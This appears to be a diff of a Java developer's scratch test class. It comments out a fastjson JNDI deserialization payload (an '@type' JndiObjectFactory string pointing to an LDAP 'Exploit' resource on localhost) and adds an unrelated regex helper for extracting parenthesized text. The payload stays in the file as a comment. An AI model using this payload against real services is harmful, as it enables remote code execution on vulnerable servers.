@@ -17,6 +17,8 @@ import java.util.Map;
 import java.util.concurrent.*;
 import java.util.concurrent.locks.Lock;
 import java.util.concurrent.locks.ReentrantLock;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 /**
  * @author zhangtao
@@ -172,10 +174,23 @@ public class Test {
 //
 //        System.out.println(JSON.toJSONString(testResp));
 
-        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
-        JSONObject.parseObject(payload);
+//        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
+//        JSONObject.parseObject(payload);
+
+        String msg = "allowanceFunc_calIntegral(1) +  queryCount +  sum ( sum(queryCount) + allowanceFunc_itemWorkloadScale())";
+        List<String> list = getMsg(msg);
+        System.out.println(list);
     }
 
+    public static List<String> getMsg(String msg) {
+        List<String> list = new ArrayList<String>();
+        Pattern p = Pattern.compile("(\\()([0-9a-zA-Z\\.\\/\\=])*(\\))");
+        Matcher m = p.matcher(msg);
+        while (m.find()) {
+            list.add(m.group(0).substring(1, m.group().length() - 1));
+        }
+        return list;
+    }
     static class T {
         private Integer a;
         private String b;
